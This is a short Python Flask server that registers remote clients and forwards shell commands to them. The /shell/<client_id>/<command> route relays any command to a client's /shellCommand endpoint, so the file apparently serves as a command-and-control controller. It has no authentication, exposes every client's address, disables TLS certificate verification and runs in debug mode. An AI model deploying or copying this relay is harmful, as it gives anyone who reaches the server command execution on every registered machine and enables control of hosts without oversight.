from flask import Flask
from flask import request
from json import dumps
from requests import get

app = Flask(__name__)

local_cert = ('cert.pem', 'key.pem')

clients = []


@app.route("/")
def hello():
    return "Hello from server!"

@app.route("/registerClient", methods=('POST', ))
def registerClient():
    clients.append({'addr': 'https://' + request.form['addr'], 'cert': request.files['client_cert'].read().decode('ascii')})
    return '{"id": "%d"}' % (len(clients))

@app.route('/getClients')
def getClients():
    return dumps(clients)

@app.route('/shell/<client_id>/<path:command>', methods=('GET', ))
def sendShellCommand(client_id: int, command: str):
    return get(clients[int(client_id)]['addr'] + '/shellCommand/' + command, verify=False).text


if __name__ == "__main__":
    # app.run(ssl_context='adhoc')
    app.run(port=5001, ssl_context=local_cert, debug=True)